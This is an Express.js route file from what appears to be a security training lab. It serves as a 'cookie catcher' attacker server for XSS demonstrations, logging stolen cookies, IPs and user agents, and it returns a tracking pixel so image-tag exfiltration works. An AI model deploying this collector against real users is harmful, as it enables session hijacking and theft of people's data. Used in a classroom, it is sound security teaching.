const express = require('express');
const router = express.Router();

// Logger - Cookie Catcher for XSS demos
// Students use this as their "attacker server"

// In-memory log storage (resets on restart)
let logs = [];

// View logs
router.get('/', (req, res) => {
  res.render('labs/logger', {
    title: 'Cookie Logger',
    logs: logs.slice().reverse() // Newest first
  });
});

// Catch endpoint - receives stolen cookies
router.get('/catch', (req, res) => {
  const logEntry = {
    id: logs.length + 1,
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    query: req.query,
    cookies: req.query.c || req.query.cookie || null,
    userAgent: req.headers['user-agent'] || 'Unknown',
    referer: req.headers['referer'] || null
  };

  logs.push(logEntry);
  console.log('[Logger] Caught:', logEntry);

  // Return a 1x1 transparent pixel (so <img> tags work)
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.writeHead(200, {
    'Content-Type': 'image/gif',
    'Content-Length': pixel.length
  });
  res.end(pixel);
});

// Also support POST
router.post('/catch', (req, res) => {
  const logEntry = {
    id: logs.length + 1,
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    body: req.body,
    cookies: req.body.c || req.body.cookie || null,
    userAgent: req.headers['user-agent'] || 'Unknown',
    referer: req.headers['referer'] || null
  };

  logs.push(logEntry);
  console.log('[Logger] Caught (POST):', logEntry);

  res.json({ status: 'logged' });
});

// Clear logs
router.get('/clear', (req, res) => {
  logs = [];
  res.redirect('/logger');
});

module.exports = router;
